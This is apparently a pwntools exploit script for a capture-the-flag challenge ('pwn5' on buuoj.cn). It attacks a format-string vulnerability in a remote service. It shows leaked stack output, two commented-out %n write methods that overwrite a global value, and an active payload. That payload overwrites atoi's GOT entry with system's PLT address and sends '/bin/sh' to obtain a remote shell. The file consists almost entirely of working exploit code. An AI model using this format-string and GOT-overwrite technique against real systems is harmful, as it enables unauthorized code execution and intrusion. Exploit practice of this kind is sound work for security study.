from pwn import *

func = 0x0804C044

r = remote('node5.buuoj.cn', 25766)

'''
your name:cccc.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Hello,cccc.0xffec73d8.0x63.(nil).0xffec73fe.0x3.0xc2.0xf7e7d91b.0xffec73fe.0xffec74fc.0x63636363.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
your passwd:
'''

# method 1
# r.recvuntil('your name:')
# r.sendline(p32(func) + b'%10$n')
# r.recvuntil('your passwd:')
# r.sendline(str(0x04))
# r.interactive()

# method 2
# r.recvuntil('your name:')
# r.sendline(p32(func) + p32(func+1) + p32(func+2) + p32(func+3) + b'%10$n%11$n%12$n%13$n')
# r.recvuntil('your passwd:')
# r.sendline(str(0x10101010))
# r.interactive()

# method 3, 修改atoi的got表为system地址
# elf = ELF("./pwn5")
# atoi_addr = elf.got['atoi']
# system_addr = elf.plt['system']
# print(hex(atoi_addr))  # got表地址：0x804c034
# print(hex(system_addr))  # plt地址：0x8049080
# payload = fmtstr_payload(10, {atoi_addr: system_addr})
payload = fmtstr_payload(10, {0x804c034: 0x8049080})
r.sendline(payload)
r.send("/bin/sh\x00")
r.interactive()
